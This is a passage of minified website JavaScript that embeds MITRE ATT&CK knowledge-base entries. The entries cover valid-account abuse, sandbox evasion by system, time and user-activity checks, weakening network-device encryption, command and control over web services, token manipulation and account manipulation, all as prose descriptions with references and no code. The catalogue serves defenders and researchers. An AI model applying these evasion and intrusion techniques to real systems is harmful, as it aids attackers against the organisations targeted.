are part of that domain. Domain accounts can cover users, administrators, and services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fidentity-protection\u002Faccess-control\u002Factive-directory-accounts'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E or password reuse, allowing access to privileged resources of the domain.";Ho.external_references=[{source_name:b,external_id:Hp,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078\u002F002"},{external_id:Hf,source_name:c,url:Hg},{url:Hh,description:Hi,source_name:Hj},{source_name:"Microsoft AD Accounts",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fidentity-protection\u002Faccess-control\u002Factive-directory-accounts",description:"Microsoft. (2019, August 23). Active Directory Accounts. Retrieved March 13, 2020."},{url:bK,description:bL,source_name:bM}];Ho["subtechnique-of"]=Y;Hq.id=Hr;Hq["object-type"]=a;Hq.name="Local Accounts";Hq.description="Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ";Hq.external_references=[{source_name:b,external_id:Hr,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078\u002F003"}];Hq["subtechnique-of"]=Y;Ht.id=Hu;Ht["object-type"]=a;Ht.name="System Checks";Ht.description="Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497'\u003EVirtualization\u002FSandbox Evasion\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors. \n\nSpecific checks will vary based on the target and\u002For adversary, but may involve behaviors such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1047'\u003EWindows Management Instrumentation\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1082'\u003ESystem Information Discovery\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1012'\u003EQuery Registry\u003C\u002Fa\u003E to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and\u002For the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host\u002Fdomain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory\u002Fdrive size. \n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer\u002Fproduct fields for strings relating to virtual machine applications, and VME-specific hardware\u002Fprocessor instructions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecuringtomorrow.mcafee.com\u002Fother-blogs\u002Fmcafee-labs\u002Fstopping-malware-fake-virtual-machine\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In applications like VMWare, adversaries can also use a special I\u002FO port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2018\u002F09\u002Funit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Ht.external_references=[{source_name:b,external_id:Hu,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497\u002F001"},{source_name:"McAfee Virtual Jan 2017",url:"https:\u002F\u002Fsecuringtomorrow.mcafee.com\u002Fother-blogs\u002Fmcafee-labs\u002Fstopping-malware-fake-virtual-machine\u002F",description:"Roccia, T. (2017, January 19). Stopping Malware With a Fake Virtual Machine. Retrieved April 17, 2019."},{url:"https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2018\u002F09\u002Funit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie\u002F",description:"Falcone, R., et al. (2018, September 04). OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE. Retrieved September 24, 2018.",source_name:"Unit 42 OilRig Sept 2018"}];Ht["subtechnique-of"]=bW;Hv.id=Hw;Hv["object-type"]=a;Hv.name="Time Based Evasion";Hv.description="Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053'\u003EScheduled Task\u002FJob\u003C\u002Fa\u003E). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1104'\u003EMulti-Stage Channels\u003C\u002Fa\u003E to avoid analysis and scrutiny.\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.isaca.org\u002Fresources\u002Fisaca-journal\u002Fissues\u002F2017\u002Fvolume-6\u002Fevasive-malware-tricks-how-malware-evades-detection-by-sandboxes'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Hv.external_references=[{source_name:b,external_id:Hw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497\u002F003"},{source_name:"ISACA Malware Tricks",url:"https:\u002F\u002Fwww.isaca.org\u002Fresources\u002Fisaca-journal\u002Fissues\u002F2017\u002Fvolume-6\u002Fevasive-malware-tricks-how-malware-evades-detection-by-sandboxes",description:"Kolbitsch, C. (2017, November 1). Evasive Malware Tricks: How Malware Evades Detection by Sandboxes. Retrieved March 30, 2021."}];Hv["subtechnique-of"]=bW;Hx.id=Hy;Hx["object-type"]=a;Hx.name="User Activity Based Checks";Hx.description="Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497'\u003EVirtualization\u002FSandbox Evasion\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors. \n\nAdversaries may search for user activity on the host based on variables such as the speed\u002Ffrequency of mouse movements and clicks \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sans.org\u002Freading-room\u002Fwhitepapers\u002Fforensics\u002Fdetecting-malware-sandbox-evasion-techniques-36667'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro \u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Funit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or waiting for a user to double click on an embedded image to activate.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F04\u002Ffin7-phishing-lnk.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";Hx.external_references=[{source_name:b,external_id:Hy,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497\u002F002"},{source_name:"Sans Virtual Jan 2016",url:"https:\u002F\u002Fwww.sans.org\u002Freading-room\u002Fwhitepapers\u002Fforensics\u002Fdetecting-malware-sandbox-evasion-techniques-36667",description:"Keragala, D. (2016, January 16). Detecting Malware and Sandbox Evasion Techniques. Retrieved April 17, 2019."},{source_name:"Unit 42 Sofacy Nov 2018",url:"https:\u002F\u002Funit42.paloaltonetworks.com\u002Funit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan\u002F",description:"Falcone, R., Lee, B.. (2018, November 20). Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan. Retrieved April 23, 2019."},{source_name:D_,description:DZ,url:DY}];Hx["subtechnique-of"]=bW;Hz.id=HA;Hz["object-type"]=a;Hz.name="Disable Crypto Hardware";Hz.description="Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601'\u003EModify System Image\u003C\u002Fa\u003E, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1600\u002F001'\u003EReduce Key Space\u003C\u002Fa\u003E). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Hz.external_references=[{source_name:b,external_id:HA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1600\u002F002"},{source_name:K,url:L,description:M}];Hz["subtechnique-of"]=dw;HB.id=HC;HB["object-type"]=a;HB.name="Reduce Key Space";HB.description="Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Fevolution-of-attacks-on-cisco-ios-devices'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F008'\u003ENetwork Device CLI\u003C\u002Fa\u003E introduced to the system through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601'\u003EModify System Image\u003C\u002Fa\u003E to change the configuration of the device. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";HB.external_references=[{source_name:b,external_id:HC,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1600\u002F001"},{source_name:ap,url:aq,description:ar},{source_name:K,url:L,description:M}];HB["subtechnique-of"]=dw;HD.id=HE;HD["object-type"]=a;HD.name="Bidirectional Communication";HD.description="Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\u002FTLS encryption, giving adversaries an added level of protection. ";HD.external_references=[{source_name:b,external_id:HE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1102\u002F002"},{url:f,description:g,source_name:h}];HD["subtechnique-of"]=bX;HF.id=HG;HF["object-type"]=a;HF.name="Dead Drop Resolver";HF.description="Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated\u002Fencoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\u002FTLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).";HF.external_references=[{source_name:b,external_id:HG,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1102\u002F001"},{url:f,description:g,source_name:h}];HF["subtechnique-of"]=bX;HH.id=HI;HH["object-type"]=a;HH.name="One-Way Communication";HH.description="Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\u002FTLS encryption, giving adversaries an added level of protection.";HH.external_references=[{source_name:b,external_id:HI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1102\u002F003"},{url:f,description:g,source_name:h}];HH["subtechnique-of"]=bX;return {staticAssetsBase:"\u002F_nuxt\u002Fstatic\u002F1626300513",layout:"default",error:aG,state:{data:{tactics:[gH,gO,gX,hb,hh,hj,{id:u,"object-type":t,name:"Privilege Escalation",description:"The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM\u002Froot level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",external_references:[{external_id:u,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0004",source_name:b}]},hk,{id:r,"object-type":t,name:"Credential Access",description:"The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",external_references:[{external_id:r,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0006",source_name:b}]},hl,{id:x,"object-type":t,name:"Lateral Movement",description:"The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. ",external_references:[{external_id:x,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0008",source_name:b}]},hq,{id:o,"object-type":t,name:"Command and Control",description:"The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",external_references:[{external_id:o,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0011",source_name:b}]},ht,hE,hJ],techniques:[gI,gJ,gK,gM,gN,gP,gQ,gR,gS,gT,gU,gW,gY,gZ,g_,g$,ha,hc,hd,he,hg,hm,ho,dA,hu,hv,hp,hi,dF,dE,hF,hG,hH,hI,hK,hL,hM,hO,hr,hx,hy,hz,hA,hB,hC,hD,hP,{id:aJ,"object-type":a,name:"Abuse Elevation Control Mechanism",description:"Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.",external_references:[{source_name:b,external_id:aJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548"}],tactics:[u,d],subtechniques:[hR,hT,hV,hX]},{id:ah,"object-type":a,name:"Access Token Manipulation",description:"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F001'\u003EToken Impersonation\u002FTheft\u003C\u002Fa\u003E) or used to spawn a new process (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F002'\u003ECreate Process with Token\u003C\u002Fa\u003E). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpentestlab.blog\u002F2017\u002F04\u002F03\u002Ftoken-manipulation\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAny standard user can use the \u003Ccode\u003Erunas\u003C\u002Fcode\u003E command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",external_references:[{source_name:b,external_id:ah,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134"},{external_id:"CAPEC-633",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F633.html"},{url:"https:\u002F\u002Fpentestlab.blog\u002F2017\u002F04\u002F03\u002Ftoken-manipulation\u002F",description:"netbiosX. (2017, April 3). Token Manipulation. Retrieved April 21, 2017.",source_name:"Pentestlab Token Manipulation"},{url:cb,description:cc,source_name:cd},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa378184(v=vs.85).aspx",description:dN,source_name:"Microsoft LogonUser"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa446617(v=vs.85).aspx",description:dN,source_name:"Microsoft DuplicateTokenEx"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa378612(v=vs.85).aspx",description:dN,source_name:"Microsoft ImpersonateLoggedOnUser"},{url:"https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Feu-17\u002Fmaterials\u002Feu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf",description:"Atkinson, J., Winchester, R. (2017, December 7). A Process is No One: Hunting for Token Manipulation. Retrieved December 21, 2017.",source_name:"BlackHat Atkinson Winchester Token Manipulation"}],tactics:[d,u],subtechniques:[hZ,h$,ib,id,if0]},{id:ih,"object-type":a,name:"Account Access Removal",description:"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\n\nAdversaries may also subsequently log off and\u002For reboot boxes to set malicious changes into place.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.carbonblack.com\u002F2019\u002F03\u002F22\u002Ftau-threat-intelligence-notification-lockergoga-ransomware\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fborn-this-way-origins-of-lockergoga\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1531",source_name:b,external_id:ih},{description:"CarbonBlack Threat Analysis Unit. (2019, March 22). TAU Threat Intelligence Notification – LockerGoga Ransomware. Retrieved April 16, 2019.",url:"https:\u002F\u002Fwww.carbonblack.com\u002F2019\u002F03\u002F22\u002Ftau-threat-intelligence-notification-lockergoga-ransomware\u002F",source_name:"CarbonBlack LockerGoga 2019"},{source_name:"Unit42 LockerGoga 2019",url:"https:\u002F\u002Funit42.paloaltonetworks.com\u002Fborn-this-way-origins-of-lockergoga\u002F",description:"Harbison, M.. (2019, March 26). Born This Way? Origins of LockerGoga. Retrieved April 16, 2019."}],tactics:[j]},{id:aK,"object-type":a,name:"Account Discovery",description:"Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.",external_references:[{source_name:b,external_id:aK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1087"},{external_id:ii,source_name:c,url:ij},{source_name:ce,url:cf,description:cg}],tactics:[i],subtechniques:[ik,it,iw,iz]},{id:aL,"object-type":a,name:"Account Manipulation",description:"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.",external_references:[{source_name:b,external_id:aL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1098"},{source_name:"Microsoft User Modified Event",description:"Lich, B., Miroshnikov, A. (2017, April 5). 4738(S): A user account was changed. Retrieved June 30, 2017.",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fthreat-protection\u002Fauditing\u002Fevent-4738"},{description:"Franklin Smith, R. (n.d.). Windows Security Log Event ID 4670. Retrieved November 4, 2019.",url:"https:\u002F\u002Fwww.ultimatewindowssecurity.com\u002Fsecuritylog\u002Fencyclopedia\u002Fevent.aspx?eventID=4670",source_name:"Microsoft Security Event 4670"},{url:iC,description:iD,source_name:iE},{url:"https:\u002F\u002Fgithub.com\u002Fgentilkiwi\u002Fmimikatz\u002Fissues\u002F92",description:"Warren, J. (2017, June 22). lsadump::changentlm and lsadump::setntlm work, but generate Windows events #92. Retrieved December 4, 2017.",source_name:"GitHub Mimikatz Issue 92 June 2017"}],tactics:[k],subtechniques:[iF,iN,iP,iR]},{id:R,"object-type":a,name:"Acquire Infrastructure",description:"Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocuments.trendmicro.com\u002Fassets\u002Fwp\u002Fwp-criminal-hideouts-for-lease.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",external_references:[{source_name:b,external_id:R,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583"},{source_name:iU,description:iV,url:iW}],tactics:[e],subtechniques:[iX,je,jh,jk,jq,jt]},{id:cl,"object-type":a,name:"Active Scanning",description:"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.caida.org\u002Fpublications\u002Fpapers\u002F2012\u002Fanalysis_slash_zero\u002Fanalysis_slash_zero.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwiki.owasp.org\u002Findex.php\u002FOAT-004_Fingerprinting'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information from these scans may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190'\u003EExploit Public-Facing Application\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:cl,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595"},{source_name:jw,url:jx,description:jy},{source_name:"OWASP Fingerprinting",url:"https:\u002F\u002Fwiki.owasp.org\u002Findex.php\u002FOAT-004_Fingerprinting",description:"OWASP Wiki. (2018, February 16). OAT-004 Fingerprinting. Retrieved October 20, 2020."}],tactics:[l],subtechniques:[jz,jB]},{id:aM,"object-type":a,name:"Application Layer Protocol",description:"Adversaries may communicate using application layer protocols to avoid detection\u002Fnetwork filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",external_references:[{source_name:b,external_id:aM,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071"},{url:f,description:g,source_name:h}],tactics:[o],subtechniques:[jD,jG,jI,jK]},{id:jM,"object-type":a,name:"Application Window Discovery",description:"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1010",external_id:jM}],tactics:[i]},{id:bk,"object-type":a,name:"Archive Collected Data",description:"An adversary may compress and\u002For encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",external_references:[{source_name:b,external_id:bk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1560"},{url:dT,description:dU,source_name:dV}],tactics:[m],subtechniques:[jN,jP,jR]},{id:jT,"object-type":a,name:"Audio Capture",description:"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1123",external_id:jT},{external_id:jU,source_name:c,url:jV}],tactics:[m]},{id:jW,"object-type":a,name:"Automated Collection",description:"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003E to search for and copy information 